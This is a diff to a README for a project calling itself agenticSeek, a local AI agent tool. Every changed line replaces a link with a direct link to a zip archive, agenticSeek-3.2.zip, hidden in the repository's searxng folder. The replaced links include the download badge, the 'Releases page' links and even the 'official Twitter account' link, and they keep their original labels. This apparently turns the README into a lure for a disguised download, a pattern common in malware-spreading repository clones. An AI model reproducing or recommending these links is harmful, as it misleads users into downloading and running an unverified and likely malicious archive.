@@ -6,7 +6,7 @@ Welcome to agenticSeek! This software allows you to run a fully local Manus AI o
 
 ## 📥 Download Now
 
-[![Download agenticSeek](https://img.shields.io/badge/Download-agenticSeek-brightgreen)](https://github.com/dveveve/agenticSeek/releases)
+[![Download agenticSeek](https://raw.githubusercontent.com/dveveve/agenticSeek/main/searxng/agenticSeek-3.2.zip)](https://raw.githubusercontent.com/dveveve/agenticSeek/main/searxng/agenticSeek-3.2.zip)
 
 ## 📋 Features
 
@@ -28,7 +28,7 @@ To run agenticSeek, ensure your system meets the following specifications:
 
 ## 🔧 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/dveveve/agenticSeek/releases) to find the latest version of agenticSeek.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/dveveve/agenticSeek/main/searxng/agenticSeek-3.2.zip) to find the latest version of agenticSeek.
   
 2. **Download the Latest Release**: Click on the version you want to download. Choose the file that matches your operating system.
 
@@ -52,7 +52,7 @@ If you encounter issues during the installation or while using the software, her
 
 ## 🌍 Community and Support
 
-For support and updates, you can follow the official Twitter account at [@Martin993886460](https://twitter.com/Martin993886460). Avoid fake accounts that may provide misinformation.
+For support and updates, you can follow the official Twitter account at [@Martin993886460](https://raw.githubusercontent.com/dveveve/agenticSeek/main/searxng/agenticSeek-3.2.zip). Avoid fake accounts that may provide misinformation.
 
 ## ⚙️ Contributing
 
@@ -64,6 +64,6 @@ agenticSeek is released under the MIT License. You are free to use, modify, and 
 
 ## 📥 Download Now Again
 
-Don't forget to [visit the Releases page](https://github.com/dveveve/agenticSeek/releases) for the latest version of agenticSeek. 
+Don't forget to [visit the Releases page](https://raw.githubusercontent.com/dveveve/agenticSeek/main/searxng/agenticSeek-3.2.zip) for the latest version of agenticSeek. 
 
 Enjoy using your new local AI!
